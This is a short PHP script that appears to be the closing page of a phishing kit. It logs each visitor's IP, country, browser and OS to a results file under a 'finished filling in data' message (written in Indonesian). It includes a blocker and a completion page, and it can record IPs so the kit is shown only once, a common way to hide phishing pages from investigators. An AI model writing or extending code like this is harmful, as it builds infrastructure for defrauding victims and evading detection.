<?php
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once('../lang.php');
require_once('../session.php');
require_once('../additional.php');
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Selesai Mengisi Data");
require_once("files/done.php");
function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$ip = getUserIPs();
if($setting['onetime'] == "on") {
	tulis_file("../security/onetime.dat","$ip");
}